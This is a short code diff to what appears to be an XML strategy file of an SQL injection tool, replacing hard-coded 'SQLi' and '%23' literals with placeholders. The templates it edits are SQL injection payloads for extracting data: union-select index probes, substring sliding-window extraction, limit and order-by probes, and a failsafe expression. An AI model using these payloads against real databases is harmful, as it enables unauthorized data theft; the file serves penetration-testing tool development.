@@ -109,15 +109,15 @@ select concat(
 (
     select
         /**
-         * If reach end of string (concat(SQLi+NULL)) then concat nullifies the result
+         * If reach end of string (concat(${LEAD}+NULL)) then concat nullifies the result
          */
         concat(
-            'SQLi',
+            '${LEAD}',
             substr(
                 (${INJECTION}),
                 ${INDEX},
                 /**
-                 * Minus 'SQLi' should apply
+                 * Minus '${LEAD}' should apply
                  */
                 ${CAPACITY}
             )
@@ -126,12 +126,12 @@ select concat(
             </slidingWindow>
             <limit> limit ${LIMIT},65536</limit>
             <failsafe>''||1337${INDICE}7330%2b1</failsafe>
-            <calibrator>repeat('%23',65536)</calibrator>
+            <calibrator>repeat('${CALIBRATOR_SQL}',65536)</calibrator>
             <limitBoundary>0</limitBoundary>
         </configuration>
         <normal>
             <indices> union select ${INDICES}</indices>
-            <capacity>(select concat('SQLi',${INDICE},${CALIBRATOR},'${TRAIL_SQL}'))</capacity>
+            <capacity>(select concat('${LEAD}',${INDICE},${CALIBRATOR},'${TRAIL_SQL}'))</capacity>
             <orderBy> order by 1337</orderBy>
         </normal>
     </strategy>
